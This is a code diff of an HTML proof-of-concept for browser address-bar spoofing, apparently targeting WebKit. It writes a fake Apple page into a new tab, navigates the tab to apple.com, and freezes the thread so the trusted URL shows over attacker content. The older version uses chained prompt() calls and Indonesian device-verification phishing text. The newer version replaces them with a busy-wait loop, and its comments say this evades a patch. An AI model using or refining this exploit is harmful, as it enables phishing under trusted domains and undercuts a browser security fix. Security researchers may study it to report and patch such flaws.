@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Advanced Spoofing PoC - Fixed</title>
+    <title>Alternative Bypass Test PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -14,82 +14,68 @@
         height: 100%;
         background: #000;
         color: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         display: flex;
         align-items: center;
         justify-content: center;
-      }
-      .box {
-        text-align: center;
-        padding: 30px;
+        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
       button {
         padding: 20px 40px;
         font-size: 20px;
-        font-weight: bold;
         background: #ff3b30;
         color: #fff;
         border: none;
         border-radius: 12px;
         cursor: pointer;
-        box-shadow: 0 4px 15px rgba(255, 59, 48, 0.4);
       }
     </style>
   </head>
   <body>
-    <div class="box">
-      <button id="triggerBtn">JALANKAN EXPLOIT POC</button>
-    </div>
+    <button id="startBtn">TEST HEAVY BLOCKING</button>
 
     <script>
-      document.getElementById("triggerBtn").onclick = function () {
+      document.getElementById("startBtn").onclick = function () {
         this.remove();
 
-        // Membuka jendela/tab baru target
-        const targetTab = window.open("about:blank", "_blank");
+        const newTab = window.open("about:blank", "_blank");
 
-        if (targetTab) {
-          // Menulis payload visual penyerang ke dalam tab baru
-          targetTab.document.write(`
+        if (newTab) {
+          newTab.document.write(`
             <!DOCTYPE html>
             <html>
-            <head>
-              <meta charset="utf-8">
-              <title>Apple - Official Site</title>
-            </head>
-            <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <div style="padding: 30px; max-width: 600px;">
-                <h1 style="font-size:48px;font-weight:900;color:#1d1d1f;margin:0 0 20px 0;letter-spacing:-1.5px;"> Apple Store</h1>
-                <p style="font-size:22px;font-weight:600;color:#333333;margin:0 0 15px 0;">Verifikasi Perangkat Anda Diperlukan</p>
-                <p style="font-size:16px;color:#86868b;line-height:1.5;margin:0;">Viewport dikunci di bawah domain terpercaya sementara proses sinkronisasi antarmuka dihentikan.</p>
+            <head><title>Apple - Secured</title></head>
+            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
+              <div>
+                <h1 style="font-size:42px;color:#1d1d1f;">STRESS TEST VIEWPORT</h1>
+                <p style="font-size:18px;color:#86868b;">Menguji respons pipeline navigasi di bawah tekanan CPU sinkron.</p>
               </div>
             </body>
             </html>
           `);
-          targetTab.document.close();
+          newTab.document.close();
 
-          // Peningkatan Presisi Timing:
-          // 1. Memicu navigasi asinkron ke domain target (contoh: apple.com)
+          // Pemicu navigasi asinkron ke domain target
           setTimeout(() => {
             try {
-              targetTab.location.href = "https://apple.com";
-            } catch (err) {
-              console.error("Navigation dispatch error:", err);
+              newTab.location.href = "https://apple.com";
+            } catch (e) {
+              console.error(e);
             }
           }, 5);
 
-          // 2. Memicu dialog sinkron beruntun (Chain Prompt) atau satu prompt berbobot 
-          // untuk memastikan thread WebKit benar-benar terkunci sebelum commit navigasi selesai.
+          // Membekukan thread utama menggunakan beban komputasi berat (Synchronous Busy-Wait) 
+          // sebagai pengganti fungsi prompt() yang sudah ditambal oleh patch IsVisible().
           setTimeout(() => {
             try {
-              // Menggunakan loop kecil atau prompt ganda untuk memastikan thread tersendat total
-              for(let i=0; i<3; i++) {
-                targetTab.prompt("CRITICAL_SECURITY_EXCEPTION_" + i);
+              const start = Date.now();
+              // Memblokir thread selama beberapa detik secara kontinu
+              while (Date.now() - start < 3000) {
+                newTab.Math.random(); 
               }
-            } catch (err) {
-              console.error("Thread blocking failed:", err);
+            } catch (e) {
+              console.error("Execution blocked:", e);
             }
-          }, 150);
+          }, 50);
         }
       };
     </script>
